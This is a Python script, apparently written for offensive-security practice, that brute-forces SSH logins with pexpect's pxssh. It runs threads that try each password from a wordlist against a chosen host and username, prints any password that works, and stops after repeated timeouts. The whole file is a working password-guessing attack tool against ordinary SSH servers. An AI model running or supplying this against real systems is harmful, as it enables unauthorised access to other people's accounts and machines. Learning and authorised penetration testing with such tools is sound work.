# author: axi0m
# purpose: ssh bruteforcer using pxssh instead of pexpect - More modular
# usage: sshBrute.py --host 10.10.10.10 --user root -F password.txt
# example: sshBrute.py

from pexpect import pxssh
import argparse
import time
from threading import BoundedSemaphore
from threading import Thread

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release: bool):
    """Wrapper for pxssh to connect to remote host via ssh

    :param host: hostname of the target
    :param user: username to attempt to authenticate as
    :param password: Password to try to use to connect
    :param release: Boolean flag
    """

    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(
            f"[+] Password Found: {password}"  # lgtm [py/clear-text-logging-sensitive-data]
        )
        Found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--host",
        nargs="?",
        action="store",
        dest="host",
        help="The host to target for scanning.",
    )
    parser.add_argument(
        "--user",
        nargs="?",
        action="store",
        dest="user",
        help="The username to brute-force.",
    )
    parser.add_argument(
        "--file",
        nargs="?",
        default="passwordlist.txt",
        action="store",
        dest="passfile",
        help="The password list to reference.",
    )

    args = parser.parse_args()

    host = args.host
    passfile = args.passfile
    user = args.user

    if host is None or passfile is None or user is None:
        parser.print_help()

    threads = []
    with open(passfile, "r") as passList:
        for line in passList.readlines():
            if Found:
                print(f"[+] Exiting: Password Found")
                exit(0)
            if Fails > 5:
                print(f"[!] Exiting: Too many socket timeouts.")
                exit(1)
            connection_lock.acquire()
            password = line.strip("\r").strip("\n")
            print(
                f"[-] Testing: {password}"  # lgtm [py/clear-text-logging-sensitive-data]
            )
            t = Thread(target=connect, args=(host, user, password, True))
            t.start()
            threads.append(t)
            for t in threads:
                t.join()


if __name__ == "__main__":
    main()
